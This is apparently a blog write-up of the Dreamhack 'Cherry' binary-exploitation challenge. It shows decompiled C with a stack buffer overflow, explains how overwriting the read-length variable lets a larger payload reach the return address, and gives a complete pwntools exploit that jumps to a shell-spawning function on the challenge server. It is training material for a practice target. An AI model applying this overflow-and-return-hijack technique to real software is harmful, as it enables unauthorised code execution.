+++
date = '2026-05-06'
draft = false
title = 'Dreamhack Cherry Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview

주어진 바이너리와 소스 코드를 분석하여 익스플로잇하고 플래그를 획득하세요! 플래그는 flag.txt 파일에 있습니다.

플래그의 형식은 DH{...} 입니다.

---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[6]; // [rsp+18h] [rbp-18h] BYREF
  int v5; // [rsp+1Eh] [rbp-12h] BYREF
  __int16 v6; // [rsp+22h] [rbp-Eh]
  int v7; // [rsp+24h] [rbp-Ch]
  int fd; // [rsp+28h] [rbp-8h]
  int v9; // [rsp+2Ch] [rbp-4h]

  v9 = 0;
  fd = 1;
  v5 = 1919248483;
  v6 = 31090;
  v7 = 16;
  initialize(argc, argv, envp);
  write(1, "Menu: ", 6u);
  read(0, buf, 0x10u);
  if ( !strncmp(buf, "cherry", 6u) )
  {
    write(fd, "Is it cherry?: ", 0xFu);
    read(v9, &v5, v7);
  }
  return 0;
}
```

## Identifying the vulnerabilities

There is also a `flag` function that pops a shell.

This is pretty interesting. So straight off, we can write 0x10 (16) bytes into buf of size 6; That can guarantee us `v5` (the next 4 bytes), `v6` (next 2 bytes), and two bytes of `v7`.


Then, if the first six bytes of `buf` are *cherry*, it's going to `read(v9, &v5, v7)`. That means from stdin and 16 bytes (`v7`); So it's going to read into the stack starting at `&v5`. We have control over the first two bytes of `v7`, as mentioned above. 

So, we have another 16 bytes to write into `v5`: that's `v5`'s value (4 bytes), `v6` (2 bytes, __int16), `v7` (4 bytes), `fd` (4 bytes), and 2 more bytes into `v9`. But if we manage to change that 16 to, say, `0xffff`, we can write a lot more stuff.

Let's move into pwndbg and see what damage we can actually do here. 

I sent this payload:

```python
payload = ( b"cherry" + #buf 
            b"B"* 4 +  #v5, will get overwritten anyways
            b"C" * 2 + #v6
            b"\xff\xff" #v7; biggest value possible
          )
```

And we successfully overwrote `v7`!

![challenge-screenshot](yay.png#center)

Now, we can build the rest of our payload normally. And we got the flag!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/cherry/chall')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:18221'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#so if we overwrite v7, we can write more bytes into v5

#gdb.attach(p, gdbscript = "b * 0x4013b7")
payload = ( b"cherry" + #buf 
            b"B"* 4 +  #v5, will get overwritten anyways
            b"C" * 2 + #v6
            b"\xff\xff" #v7; biggest value possible
          )
p.send(payload)

p.recvuntil(b"cherry?: ")

flag = 0x4012bc

payload = ( b"A" * (4+2+4+4+4) + #padding to rbp
            b"B" * 8 +
            p64(flag)
            )
            
p.sendline(payload)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/cherry.py)**.
